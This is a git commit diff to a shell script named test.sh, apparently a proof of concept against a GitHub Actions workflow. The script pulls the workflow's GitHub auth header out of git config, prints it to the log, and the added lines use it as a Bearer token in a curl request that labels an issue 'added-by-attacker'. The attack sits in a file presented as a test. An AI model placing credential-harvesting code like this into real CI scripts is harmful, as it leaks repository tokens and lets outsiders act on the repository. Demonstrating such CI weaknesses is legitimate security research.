2c1e0e94bc6f41b98be628cda335d798f18d98b4
ndavisontest <58317833+ndavisontest@users.noreply.github.com>
2023-07-31 21:31:34 +1000

    Update test.sh

--- test.sh
+++ test.sh
@@ -3,3 +3,9 @@
 GH=$(git config --get http.https://github.com/.extraheader | base64 | tr -d '\n')
 
 echo $GH
+
+curl --location --request POST 'https://api.github.com/repos/ndavison/actions-test/issues/31/labels' \
+--header 'Accept: application/vnd.github.v3+json' \
+--header "Authorization: Bearer $GH" \
+--header 'Content-Type: application/json' \
+--data-raw '{"labels": ["added-by-attacker"]}'
